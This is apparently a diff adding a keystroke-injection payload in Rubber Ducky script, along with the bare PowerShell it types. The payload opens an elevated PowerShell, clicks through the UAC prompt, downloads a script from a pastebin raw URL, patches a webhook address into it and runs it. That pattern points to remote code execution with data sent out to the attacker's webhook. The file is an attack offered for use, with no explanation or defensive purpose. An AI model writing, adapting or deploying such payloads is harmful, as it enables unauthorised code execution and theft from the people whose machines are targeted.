@@ -1,0 +1,41 @@
+(new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/jVVYXGaD','update-script.ps1')
+$content = Get-Content -Path $env:USERPROFILE\update-script.ps1
+$newContent = $content -replace '@Webapp@', 'WEBHOOK HERE'
+$newContent | Set-Content -Path $env:USERPROFILE\update-script.ps1
+powershell $env:USERPROFILE\update-script.ps1
+
+-----------------------------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 800
+STRING cd $env:USERPROFILE
+DELAY 100
+ENTER
+DELAY 100
+STRING (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/jVVYXGaD','update-script.ps1')
+DELAY 100
+ENTER
+DELAY 1500
+STRING $content = Get-Content -Path $env:USERPROFILE\update-script.ps1
+DELAY 100
+ENTER
+DELAY 100
+STRING $newContent = $content -replace '@Webapp@', 'WEBHOOK HERE'
+DELAY 100
+ENTER
+DELAY 100
+STRING $newContent | Set-Content -Path $env:USERPROFILE\update-script.ps1
+DELAY 100
+ENTER
+DELAY 100
+STRING powershell $env:USERPROFILE\update-script.ps1
+DELAY 100
+ENTER
+DELAY 100
